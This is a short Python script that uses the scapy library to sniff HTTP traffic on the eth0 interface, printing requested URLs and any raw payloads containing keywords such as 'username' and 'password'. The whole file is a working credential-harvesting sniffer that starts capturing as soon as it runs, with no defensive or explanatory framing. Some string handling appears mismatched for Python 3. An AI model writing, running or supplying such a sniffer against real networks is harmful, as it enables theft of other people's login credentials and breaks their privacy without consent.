import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        result = packet[scapy.Raw].load
        keywords = ['username', 'password', 'uname', 'pass']
        for word in keywords:
            if word in result:
                return result


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('\n\n Possible urls are: ' + url + '\n\n')
        login = get_login(packet)
        if login:
            print('\n\n Possibe username/password: ' + login + '\n\n')


sniff('eth0')
